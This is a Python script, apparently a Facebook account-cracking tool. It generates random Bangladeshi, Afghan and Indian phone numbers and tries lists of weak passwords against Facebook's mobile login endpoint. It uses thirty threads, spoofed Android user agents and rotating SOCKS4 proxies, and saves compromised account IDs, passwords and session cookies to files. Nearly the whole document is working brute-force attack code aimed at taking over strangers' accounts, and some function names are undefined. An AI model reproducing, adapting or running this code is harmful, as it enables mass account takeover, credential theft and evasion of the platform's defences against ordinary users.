5Z','Reno 6','Reno 6 Pro','Reno 6 Pro 5G','Reno 6 Pro Plus','Reno 6 Z 5G','Reno 7','Reno 7 Pro','Reno 7 SE','Reno 7A','Reno 7Z','Reno 8','Reno 8 Pro','Reno 8 Pro+','Reno 8 Z','Reno 8T','Reno 9'])
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; {mdl} Build/RP1A.{random.randrange(111111,999999)}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
#______________[LOGO]______________#
logo=(f"""PK _LOVE
\033[1;91m <\033[1;92m═══════════════════════════════════\033[1;91m>\033[1;92m
{H} • {H}Pavel KHAN -  GITHUB PK-143 - VARSION 0.0.6
\033[1;91m <\033[1;92m═══════════════════════════════════\033[1;91m>\033[1;92m""")
#______________[MUNE DEF]______________#
def main():
	os.system(f'clear')
	print(logo)
	print(f"{A}[{G1}1{A}]{G2} RANDOM CRANKING")
	print(f"{A}[{G1}2{A}] {G2}CONTACT ADMIN")
	print(f"{A}[{G1}3{A}]{G3} EXIT")
	print(f"{A}──────────────────────────────────────────────────")
	f= input(f"{G4}CHOICE {A}:>{G4}")
	if f in ["01","1"]:
		ERROR()
	elif f in ["02","2"]:
		os.system("xdg-open https://t.me/Forid404")
	elif f in ["03","3"]:
		os.system("exit")
#_____________[main random]_______________#
def ERROR():
	os.system(f'clear')
	print(logo)
	print(f"{A}[{G1}1{A}]{G2} BANGLADESH CRANKING")
	print(f"{A}[{G1}2{A}] {G2}AFGHANISTAN CRANKING")
	print(f"{A}[{G1}3{A}]{G3} INDIA CRANKING")
	print(f"{A}[{G1}3{A}]{G3} BACK")
	print(f"{A}──────────────────────────────────────────────────")
	hxd=input(f"{G4}CHOICE {A}:>{G4}")
	if hxd in ["01","1"]:
		error()
	elif hxd in ["02","2"]:
		ag()
	elif hxd in ["03","3"]:
		ind()
	elif hxd in ["04","4"]:
		ERROR()
#_____________[RANDOM]_____________#
def error():
  #  print(logo)
    
	wkt = datetime.now()
	os.system(f'clear')
	print(logo)
	kode = input(f'{B}❲{A}={B}❳{G} EXAMPLE : 017 | 019 | 018 | 016\n{A}──────────────────────────────────────────────────\n{B}❲{A}={B}❳{G} ENTER SIM CODE {A}:{G2} ')
	#kodex = ''.join(random.choice(string.digits) for _ in range(2))
	#kod = ''.join(random.choice(string.digits) for _ in range(2))
	print(f'{B}❲{A}={B}❳{G} Id Limited EXAMPLE : 5000 | 10000 | 4000 | 9999\n{A}──────────────────────────────────────────────────')
	limit = int(input(f'{B}Crack Limit {M}: {H}'))
	for nmbr in range(int(limit)):
		nmp = ''.join(random.choice(string.digits) for _ in range(8))
		user.append(nmp)
	with Ngangkang(max_workers=30) as Kanjut:
		os.system(f'clear')
		print(logo)
		print(f'{B}❲{A}={B}❳{G} SIM CODE :{A} {kode}\n{B}❲{A}={B}❳{G} BANGLADESH CRANKING\n{B}❲{A}={B}❳{G} USE FLIGHT MODE FOR SPEED UP\n{A}──────────────────────────────────────────────────')
		tl = str(len(user))
		for guru in user:
			idf = kode+guru
			pwx = [idf,guru,guru[1:],idf[:7],idf[:6],idf[:8],'bangladesh','506070','405060','102030','i love you','708090','@@@###','@#@#@#']
			Kanjut.submit(asy,idf,pwx,tl,wkt)
#_____________[RANDOM-AG]_____________#
def ag():
  #  print(logo
	wkt = datetime.now()
	os.system(f'clear')
	print(logo)
	kode = input(f'{B}❲{A}={B}❳{G} EXAMPLE : +9340 | +9360 | +9330 | +9350\n{A}──────────────────────────────────────────────────\n{B}❲{A}={B}❳{G} ENTER SIM CODE {A}:{G2} ')
	kodex = ''.join(random.choice(string.digits) for _ in range(2))
	kod = ''.join(random.choice(string.digits) for _ in range(2))
	limit = str(random.randint(3000,7000))
	for nmbr in range(int(limit)):
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with Ngangkang(max_workers=30) as Kanjut:
		os.system(f'clear')
		print(logo)
		print(f'{B}❲{A}={B}❳{G} SIM CODE :{A} {kode}\n{B}❲{A}={B}❳{G} AFGHANISTAN CRANKING\n{B}❲{A}={B}❳{G} USE FLIGHT MODE FOR SPEED UP\n{A}──────────────────────────────────────────────────')
		tl = str(len(user))
		for guru in user:
			idf = kode+guru
			pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,"10002000","500500","khankhan","Afghanistan","afghanistan","afghan123","Afghan123","kabul123","100200"]
			Kanjut.submit(op,uid,pwx,tl,wkt)
#_____________[RANDOM-IND]_____________#
def ind():
#    print(logo
	wkt = datetime.now()
	os.system(f'clear')
	print(logo)
	kode = input(f'{B}❲{A}={B}❳{G} EXAMPLE : +91639 | +91934 | +91902 | +91937\n{A}──────────────────────────────────────────────────\n{B}❲{A}={B}❳{G} ENTER SIM CODE {A}:{G2} ')
	#kodex = ''.join(random.choice(string.digits) for _ in range(2))
	#kod = ''.join(random.choice(string.digits) for _ in range(2))
	print(f'{B}❲{A}={B}❳{G} Id Limited EXAMPLE : 5000 | 10000 | 4000 | 9999\n{A}──────────────────────────────────────────────────')
	limit = int(input(f'{B}Crack Limit {M}: {H}'))
	for nmbr in range(int(limit)):
		nmp = ''.join(random.choice(string.digits) for _ in range(6))
		user.append(nmp)
	with Ngangkang(max_workers=30) as Kanjut:
		os.system(f'clear')
		print(logo)
		print(f'{B}❲{A}={B}❳{G} SIM CODE :{A} {kode}\n{B}❲{A}={B}❳{G} INDIA CRANKING\n{B}❲{A}={B}❳{G} USE FLIGHT MODE FOR SPEED UP\n{A}──────────────────────────────────────────────────')
		tl = str(len(user))
		for guru in user:
			idf = kode+guru
			pwx = [idf,guru,guru[1:],idf[:7],idf[:6],idf[:8],'india123','57273200','59039200','57575751']
			Kanjut.submit(asy,idf,pwx,tl,wkt)
try:
	get_ua = open('ugent.txt','r').readlines()
	user_gent = random.choice(get_ua).replace('\n','')
	sdk_ver = re.search('Android (.*?)\)',str(user_gent)).group(1).split(';')[0]
	chr_ver = re.search(' Chrome/(.*?) Mobile Safari',str(user_gent)).group(1).split(' ')[0]
	set_ua = f'{user_gent}|"Not:A-Brand";v="99", "Chromium";v="'+chr_ver.split('.')[0]+f'"|{sdk_ver}|{chr_ver}'
except Exception as e:
	set_ua = f'Mozilla/5.0 (Linux; Android 5.0.2; SM-A300F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.78 Mobile Safari/537.36 OPR/30.0.1856.95530|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
#________________[METHOD-BD]________________#	
def asy(idf,pwx,tl,wkt):
	global loop,ok,cp
	waktu = str(datetime.now()-wkt).split('.')[0]
	print(f"{P}[{G2}ERROR{A}-{G2}{A}]-[{G}{waktu}{P}]{P}—[{G}{loop}{A}│{G3}{len(user)}{P}]—[{G4}{ok}{A}│{G5}{cp}{P}]", end="\r")
	ewe = requests.Session()
	ua = random.choice(ugen)
	#ua = set_ua.split('|')[0];ch_ua = set_ua.split('|')[1];sdk_ver = set_ua.split('|')[2];chr_ver = set_ua.split('|')[3];rasel_xd[4];dark_error[5]
	rr = random.randint
	rc = random.choice
	xoxof = random.choice(["SM-J320F", "SM-N975F", "SM-S918B", "SM-N986U", "SM-S908U", "SM-G991B", "SM-A528B", "SM-A536B", "SM-A146U", "SM-A037U", "SM-N975F", "SM-N960F", "SM-G960U", "SM-A202F", "SM-G965U", "YA-L29", "SM-A115U", "SM-S918B", "SM-F711B", "SM-A336B", "SM-G975U", "SM-N9860", "SM-N9860", "SM-G996U", "SM-G998U", "SM-A750GN", "SM-N770F", "SM-G900F", "SM-Z130H", "SM-G900F", "SM-G900F", "SM-T800", "SM-N900V", "SAMSUNG GT-I9515", "SM-T530NU", "SM-T530", "SM-Z130H", "SM-Z130H", "SM-G360T1", "SM-A800F", "SM-T530", "SM-G928F", "SM-G925F", "SM-T817T", "SM-T355Y", "SM-J200G", "SM-N915F", "SM-P901", "SM-G531H", "SM-J701M", "SM-J111F", "SM-J105Y", "SM-J120F", "SM-T550", "SM-Z200Y", "SM-J500FN", "SM-A800F", "SM-T280", "SM-J120H", "SM-A310F", "SM-T530", "SM-T331", "SM-A510F", "SM-S920L", "SM-G925F", "SM-T670", "SM-T670", "SM-G925F", "SM-Z200F", "SM-T585", "SM-T285", "SM-N976V", "SM-G977N", "SM-G975F", "SM-G970F", "SM-F900U", "SM-A805F", "SM-A505F", "SM-G350E", "SM-G350", "SM-G350E", "SM-J326AZ", "SM-J336AZ", "GT-P3100", "SM-A202F", "SM-A260F", "SM-A145R", "SM-A136B", "SM-A546B", "SM-A736B", "SM-A530F", "SM-G885F", "SM-A805F", "SM-A910F", "SM-G8850", "SM-G316MY", "SM-G318H", "SM-G850F", "SM-G386T", "GT-I5801", "SM-C7010", "SM-C9000", "EK-GC100", "SM-G355H", "SM-G350E", "SM-G360H", "SM-G361H", "SM-G361HU", "SM-G360BT", "SM-G360T", "SM-G360BT", "SM-G361H", "SM-G361", "GT-I8730", "SM-G1650", "SM-G1650", "SM-R810", "SM-R905U", "SM-R905N", "SM-J200BT", "SM-J200G", "SM-J337R4", "SM-J337U", "SM-J337W", "SM-J337A", "SM-J337R", "SM-S327VL", "SM-J330F", "SM-J327T1", "SM-N975U", "SM-A205F"])
	for pw in pwx:
		try:
			xx = open('Proksi.txt','r').read().splitlines()
			zz = {
					'http': 'socks4://'+random.choice(xx)
					}
			link = ewe.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=1844643672435929&kid_directed_site=0&app_id=1844643672435929&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fclient_id%3D1844643672435929%26state%3D599bda616282d8827bcbe7604b24ce20%26response_type%3Dcode%26sdk%3Dphp-sdk-5.0.0%26redirect_uri%3Dhttps%253A%252F%252Flogin.shopclues.com%252Fsignuplogin%252Ffb_login%253Flayout%253Dmobile%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd4d03ba2-f8f8-49ef-9151-6198d15dd0c0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Flogin.shopclues.com%2Fsignuplogin%2Ffb_login%3Flayout%3Dmobile%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D599bda616282d8827bcbe7604b24ce20%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {
				"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
				"li": re.search('name="li" value="(.*?)"', str(link)).group(1),
				"try_number": 0,
				"unrecognized_tries": 0,
				"email": idf,
				"prefill_contact_point": idf,
				"prefill_source": "browser_dropdown",
				"prefill_type": "contact_point",
				"first_prefill_source": "browser_dropdown",
				"first_prefill_type": "contact_point",
				"had_cp_prefilled": True,
				"had_password_prefilled": False,
				"is_smart_lock": False,
				"bi_xrwh": 0,
				"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
				"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
				"jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),
				"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)}
			cookies = {
			    'sb': 'JhMgZkfXMZv1elLOqEBiwZfP',
			    'datr': 'JhMgZi6P6s4TMI2p3hfJEcis',
			    'm_pixel_ratio': '3',
			    'wd': '360x703',
			    'fr': '08Fg7cz4eInduwW7K..BmIBMm..AAA.0.0.BmIBMr.AWV5jLFammU',
}
			headers = {
    'authority': 'm.facebook.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'sb=8qEgZsf0FR3O0oTJ5IoAxNmD; datr=8qEgZu6ySwBu-oYMG5xhEVfv; m_pixel_ratio=3; wd=360x703; fr=0EOtswJrUALjgeL7d..BmIKHy..AAA.0.0.BmIKH4.AWVxE7rTHlo',
    'dpr': '3',
    'origin': 'https://m.facebook.com',
    'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1844643672435929&kid_directed_site=0&app_id=1844643672435929&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fclient_id%3D1844643672435929%26state%3D599bda616282d8827bcbe7604b24ce20%26response_type%3Dcode%26sdk%3Dphp-sdk-5.0.0%26redirect_uri%3Dhttps%253A%252F%252Flogin.shopclues.com%252Fsignuplogin%252Ffb_login%253Flayout%253Dmobile%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd4d03ba2-f8f8-49ef-9151-6198d15dd0c0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Flogin.shopclues.com%2Fsignuplogin%2Ffb_login%3Flayout%3Dmobile%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D599bda616282d8827bcbe7604b24ce20%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': f'"{xoxof}"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': f'"{str(rr(6,14))}"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': ummmah(),
    'x-asbd-id': '129477',
    'x-fb-lsd': 'AVpdpjjG52A',
    'x-requested-with': 'XMLHttpRequest',
    'x-response-format': 'JSONStream',
}

			params = {
    'api_key': '1844643672435929',
    'auth_token': '9a455a9c248b58a21595930988497f9e',
    'skip_api_login': '1',
    'signed_next': '1',
    'next': 'https://m.facebook.com/v2.8/dialog/oauth?client_id=1844643672435929&state=599bda616282d8827bcbe7604b24ce20&response_type=code&sdk=php-sdk-5.0.0&redirect_uri=https%3A%2F%2Flogin.shopclues.com%2Fsignuplogin%2Ffb_login%3Flayout%3Dmobile&scope=email&ret=login&fbapp_pres=0&logger_id=d4d03ba2-f8f8-49ef-9151-6198d15dd0c0&tp=unspecified',
    'refsrc': 'deprecated',
    'app_id': '1844643672435929',
    'cancel': 'https://login.shopclues.com/signuplogin/fb_login?layout=mobile&error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=599bda616282d8827bcbe7604b24ce20#_=_',
    'lwv': '100',
}
			response = ewe.post("https://m.facebook.com/login/device-based/login/async/?api_key=1844643672435929&auth_token=9a455a9c248b58a21595930988497f9e&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fclient_id%3D1844643672435929%26state%3D599bda616282d8827bcbe7604b24ce20%26response_type%3Dcode%26sdk%3Dphp-sdk-5.0.0%26redirect_uri%3Dhttps%253A%252F%252Flogin.shopclues.com%252Fsignuplogin%252Ffb_login%253Flayout%253Dmobile%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd4d03ba2-f8f8-49ef-9151-6198d15dd0c0%26tp%3Dunspecified&refsrc=deprecated&app_id=1844643672435929&cancel=https%3A%2F%2Flogin.shopclues.com%2Fsignuplogin%2Ffb_login%3Flayout%3Dmobile%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D599bda616282d8827bcbe7604b24ce20%23_%3D_&lwv=100",
				data = data,
				cookies=cookies,
				params=params,
				headers = headers,
				allow_redirects = False,
				proxies = zz
				)
			if "checkpoint" in ewe.cookies.get_dict():
				ids = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				#print(f"\r{B}❲{G}ERROR-CP{B}❳{G} {ids} | {pw}")
				cp+=1
				#open('cp/cp-'+simpan,'a').write(ids+'|'+pw+'\n')
				open('/sdcard/ERROR-CP.txt','a').write(ids+'|'+pw+'|'+'\n')
				break
			elif "c_user" in ewe.cookies.get_dict():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
				ids = re.findall('c_user=(.*);xs', coki)[0]
				print(f"\r{B}❲{G}ERROR-OK{B}❳{G} {ids} | {pw}")
				print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} {coki}")
				open('/sdcard/ERROR-Ok-Live.txt','a').write(ids+'|'+pw+'|'+coki+'\n')
				cek_apk(ses,coki)
				ok+=1
				open('ok/ok-'+simpan,'a').write(ids+'|'+pw+'|'+coki+'\n')
				break
		except requests.exceptions.ConnectionError:time.sleep(15)
	loop +=1
#________________[METHOD-AG]________________#	
def op(uid,pwx,tl,wkt):
	global loop,ok,cp
	waktu = str(datetime.now()-wkt).split('.')[0]
	print(f"{P}[{G2}ERROR{A}-{G2}{A}]-[{G}{waktu}{P}]{P}—[{G}{loop}{A}│{G3}{len(user)}{P}]—[{G4}{ok}{A}│{G5}{cp}{P}]", end="\r")
	ewe = requests.Session()
	ua = set_ua.split('|')[0];ch_ua = set_ua.split('|')[1];sdk_ver = set_ua.split('|')[2];chr_ver = set_ua.split('|')[3];rasel_xd[4];dark_error[5]
	for pw in pwx:
		try:
			xx = open('Proksi.txt','r').read().splitlines()
			zz = {
					'http': 'socks4://'+random.choice(xx)
					}
			link = ewe.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
			data = {
				"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
				"li": re.search('name="li" value="(.*?)"', str(link)).group(1),
				"try_number": 0,
				"unrecognized_tries": 0,
				"email": uid,
				"prefill_contact_point": uid,
				"prefill_source": "browser_dropdown",
				"prefill_type": "contact_point",
				"first_prefill_source": "browser_dropdown",
				"first_prefill_type": "contact_point",
				"had_cp_prefilled": True,
				"had_password_prefilled": False,
				"is_smart_lock": False,
				"bi_xrwh": 0,
				"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
				"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
				"jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),
				"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)
				}
			headers = {
				"Host": "m.facebook.com",
				"content-length": str(len((data))),
				"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
				"sec-ch-ua-mobile": "?1",
				"user-agent": ua,
				"x-response-format": "JSONStream",
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
				"viewport-width": "360",
				"x-requested-with": "XMLHttpRequest",
				"x-asbd-id": "129477",
				"dpr": "2",
				"sec-ch-prefers-color-scheme": "light",
				"sec-ch-ua-platform": '"Android"',
				"accept": "*/*",
				"origin": "https://m.facebook.com",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"referer": "https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}
			response = ewe.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",
				data = data,
				headers = headers,
				allow_redirects = False,
				proxies = zz
				)
			if "checkpoint" in ewe.cookies.get_dict():
				ids = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				print(f"\r{B}❲{G}ERROR-CP{B}❳{G} {ids} | {pw}")
				cp+=1
				open('cp/cp-'+simpan,'a').write(ids+'|'+pw+'\n')
				break
			elif "c_user" in ewe.cookies.get_dict():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
				ids = re.findall('c_user=(.*);xs', coki)[0]
				print(f"\r{B}❲{G}ERROR-OK{B}❳{G} {ids} | {pw}{A}[{G1}√{A}]{P}──≻> {G}{tahun(ids)}")
				print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} {coki}")
				ok+=1
				open('ok/ok-'+simpan,'a').write(ids+'|'+pw+'|'+coki+'\n')
				break
		except requests.exceptions.ConnectionError:time.sleep(15)
	loop +=1
#________________[METHOD-IND]________________#	
def nd(uid,pwx,tl,wkt):
	global loop,ok,cp
	waktu = str(datetime.now()-wkt).split('.')[0]
	print(f"{P}[{G2}ERROR{A}-{G2}{A}]-[{G}{waktu}{P}]{P}—[{G}{loop}{A}│{G3}{len(user)}{P}]—[{G4}{ok}{A}│{G5}{cp}{P}]", end="\r")
	ewe = requests.Session()
	ua = random.choice(ugen)
	#ua = set_ua.split('|')[0];ch_ua = set_ua.split('|')[1];sdk_ver = set_ua.split('|')[2];chr_ver = set_ua.split('|')[3];rasel_xd[4];dark_error[5]
	for pw in pwx:
		try:
			xx = open('Proksi.txt','r').read().splitlines()
			zz = {
					'http': 'socks4://'+random.choice(xx)
					}
			link = ewe.get("https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
			data = {
				"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
				"li": re.search('name="li" value="(.*?)"', str(link)).group(1),
				"try_number": 0,
				"unrecognized_tries": 0,
				"email": uid,
				"prefill_contact_point": uid,
				"prefill_source": "browser_dropdown",
				"prefill_type": "contact_point",
				"first_prefill_source": "browser_dropdown",
				"first_prefill_type": "contact_point",
				"had_cp_prefilled": True,
				"had_password_prefilled": False,
				"is_smart_lock": False,
				"bi_xrwh": 0,
				"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
				"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
				"jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),
				"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)
				}
			headers = {
				"Host": "p.facebook.com",
				"content-length": str(len((data))),
				"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
				"sec-ch-ua-mobile": "?1",
				"user-agent": sexy(),
				"x-response-format": "JSONStream",
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
				"viewport-width": "360",
				"x-requested-with": "XMLHttpRequest",
				"x-asbd-id": "129477",
				"dpr": "2",
				"sec-ch-prefers-color-scheme": "light",
				"sec-ch-ua-platform": '"Android"',
				"accept": "*/*",
				"origin": "https://p.facebook.com",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"referer": "https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}
			response = ewe.post("https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",
				data = data,
				headers = headers,
				allow_redirects = False,
				proxies = zz
				)
			if "checkpoint" in ewe.cookies.get_dict():
				ids = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				print(f"\r{B}❲{G}ERROR-CP{B}❳{G} {ids} | {pw}")
				cp+=1
				open('cp/cp-'+simpan,'a').write(ids+'|'+pw+'\n')
				break
			elif "c_user" in ewe.cookies.get_dict():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
				ids = re.findall('c_user=(.*);xs', coki)[0]
				print(f"\r{B}❲{G}ERROR-OK{B}❳{G} {ids} | {pw}{A}[{G1}√{A}]{P}──≻> {G}{tahun(ids)}")
				print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} {coki}")
				ok+=1
				open('ok/ok-'+simpan,'a').write(ids+'|'+pw+'|'+coki+'\n')
				break
		except requests.exceptions.ConnectionError:time.sleep(15)
	loop +=1
main()